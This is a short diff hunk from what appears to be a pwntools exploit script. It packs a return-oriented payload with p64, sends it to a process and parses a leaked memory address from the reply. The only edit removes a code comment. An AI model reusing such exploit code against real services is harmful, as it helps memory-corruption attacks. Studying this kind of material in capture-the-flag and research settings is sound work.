@@ -27,7 +27,7 @@ p += p64(zzz)
 p += p64(main)
 
 r.readline()
-r.sendline(p)  # local process
+r.sendline(p)
 w = r.recvuntil('name: \n').split()
 leak = int.from_bytes(w[8], byteorder='little')  # local process
 
